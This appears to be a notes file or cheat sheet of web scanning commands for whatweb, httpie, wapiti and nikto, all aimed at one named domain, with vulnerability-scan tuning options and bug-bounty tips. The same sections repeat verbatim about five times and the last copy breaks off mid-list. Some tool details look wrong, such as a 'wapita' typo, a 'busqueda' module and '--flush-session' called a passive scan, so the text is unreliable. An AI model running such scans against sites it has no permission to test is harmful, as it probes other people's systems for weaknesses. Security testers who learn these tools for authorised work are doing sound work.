# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
